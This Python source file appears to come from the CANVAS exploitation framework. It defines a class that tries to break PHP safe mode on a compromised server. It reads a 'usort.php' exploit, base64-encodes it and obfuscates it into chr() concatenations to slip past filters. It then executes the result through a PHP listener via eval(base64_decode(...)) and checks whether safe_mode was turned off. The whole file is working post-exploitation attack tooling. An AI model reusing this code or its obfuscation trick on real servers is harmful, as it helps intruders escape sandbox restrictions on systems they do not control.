import sys
import string
if "." not in sys.path: sys.path.append(".")
import os.path

from exploitutils import b64encode
from internal import devlog

class php_break_safemode(object):
    """
    Encapsulates the "exploits" needed for breaking PHP Safe-mode.

    Uses code from Stefan Esser to do all sorts of magic things in memory.
    """
    def __init__(self,  node_listener):
        self.node_listener = node_listener
        # add future exploits here
        # every exploit in this list needs to return 1 when it's successfull
        self.exploits = ("usort_interuption",)

    # loop over all the exploits we have
    def run_exploits(self):
        for exp in self.exploits:
            if(hasattr(self, exp)):
                exp = getattr(self, exp)
                ret = exp()
                if( ret ):
                    return 1
        return 0


    def usort_interuption(self):
        """
        Optimized for size, obviously. But is size such a huge issue here? 
        """
        devlog("php_break_safemode", "Attempting usort_interuption exploit")
        from engine.config import canvas_resources_directory
        
        exploit = file(os.path.join(canvas_resources_directory, "usort.php"),"rb").read()
        exploit = b64encode(exploit)
        exploit = self.encode_php(exploit).strip()

        ret=self.node_listener.runPhpInt("eval(base64_decode("+exploit+"))")
        if(self.node_listener.getPHPIniVal("safe_mode") == 0):
            #Safemode has been disabled!
            devlog("php_break_safemode", "Safemode was disabled!")
            self.node_listener.broke_safemode=True 
            return 1
        else:
            #Safemode was not disabled. :<
            devlog("php_break_safemode", "Safemode was not disabled :<")
            return 0

    # this func is from CANVAS and should be importable
    # from somewhere, unfortunatly its in the phpexploit.py
    # class, as a class method. Attempted to make this exploit extend
    # phpexploit but you end up with errors due to
    # phplistener imports break_safemode which would import phpexploit which
    # imports get_stage_1 from phplistener....yeah :/ 
    # We could move this to exploitutils if we have to.
    def encode_php(self, shellcode):
        """
        Encodes PHP shellcode to bypass weird restrictions sometimes in 
        place
        def conv(self, command):
        return ".".join( [ 'chr(%d)' % ord(x) for x in list(command)])
        """
        ret=[]
        flag = True
        for c in shellcode:
            if c in string.ascii_letters:
                ret.append( c )
                if not flag:
                    flag = True
            else:
                if flag:
                    ret.append( ".chr(%d)." % (ord(c)) )
                else:
                    ret.append( "chr(%d)." % (ord(c)) )
                flag = False

        buf = "".join(ret)
        if buf[-1] == '.':
            buf = buf[:-1]
        return buf

    